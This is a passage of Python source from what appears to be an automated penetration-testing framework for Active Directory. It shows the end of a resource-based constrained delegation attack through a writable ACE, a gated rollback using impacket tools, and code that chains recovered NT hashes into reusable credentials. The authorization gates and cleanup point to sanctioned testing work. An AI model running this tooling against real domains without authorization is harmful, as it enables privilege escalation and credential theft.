                           f"{new}$ -> {vsam}$ (reached through a confirmed "
                           "GenericAll/GenericWrite ACE); ticket-backed SMB access"),
                proof_token=proof.proof_token("GENERIC-ALL", "rbcd", target, impersonate,
                                              new, "pwn3d" if _RE_NXC_PWNED.search(out)
                                              else "auth"),
                extra={"target": vsam, "delegate_from": f"{new}$"},
            )
        else:
            errors.append("getST_no_ticket")

        # 5) rollback (always, since we mutated) + verify --------------------
        self._rollback_rbcd(ctx, cfg, vsam, new, op_target, op_extra, mutation,
                           steps, errors, record)

        complete = getst_ok and mutation["rollback"]["performed"]
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    def _rollback_rbcd(self, ctx, cfg, vsam, new, op_target, op_extra, mutation,
                       steps, errors, record) -> None:
        """Flush the RBCD SD, delete the computer, and verify both (gated) --
        duplicated from RBCDExecutor._rollback inline, per plan §2.1."""
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"computer": f"{new}$"}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "rbcd -action flush ; addcomputer -delete"

        flush_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$", "-action", "flush",
                      "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(flush_argv, timeout=cfg.tool_timeout_s)
        flush_ok = bool(_RE_GA_RBCD_FLUSH_OK.search(res.stdout or ""))
        record("rollback_rbcd_flush", flush_argv, res, flush_ok)

        read_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$", "-action", "read",
                     "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s)
        read_out = res.stdout or ""
        cleared = (bool(_RE_GA_RBCD_READ_OK.search(read_out))
                   and f"{new}$".lower() not in read_out.lower())
        record("rollback_verify_read", read_argv, res, cleared,
               note="SD cleared" if cleared else "principal still present")

        del_argv = ["impacket-addcomputer", "-computer-name", f"{new}$", "-delete",
                    "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(del_argv, timeout=cfg.tool_timeout_s)
        del_ok = bool(_RE_GA_ADDCOMPUTER_DEL_OK.search(res.stdout or ""))
        record("rollback_delete_computer", del_argv, res, del_ok)

        mutation["rollback"]["verified"] = bool(flush_ok and cleared and del_ok)
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _first_plaintext(show_stdout: str) -> Optional[str]:
        for line in show_stdout.splitlines():
            if line.strip():
                return line.rstrip("\n")
        return None

    @staticmethod
    def _parse_ticket(stdout: str, out_dir: Path) -> Optional[str]:
        m = _RE_GA_GETST_TICKET.search(stdout)
        if not m:
            return None
        raw = m.group(2).strip()
        p = Path(raw)
        return str(p if p.is_absolute() else out_dir / p)

    # ---------------------------------------------------------------- composition (C)
    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        credentials = super().produced(ctx, finding, params, artifact)
        if not artifact.get("complete"):
            return credentials
        # The rbcd pivot yields an impersonation state (no threadable credential
        # VALUE here -- CAP_NONE, exactly as before; the engine does not thread it).
        if params["pivot"].value == "rbcd":
            return [Capability(state=states.S_IMPERSONATION_TGT, channel=CAP_NONE,
                               principal=params["impersonate"].value or "")] + credentials
        # A presence marker alone proves no threadable credential: only an actual
        # NT hash recovered by THIS invocation establishes a usable cred_for(X).
        recovered = artifact.get("_recovered_hash")
        if not recovered:
            return credentials
        target = params["target"].value
        return [Capability(state=states.cred_for(target), channel=CAP_NT_HASH,
                           value=recovered, principal=target)] + credentials

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
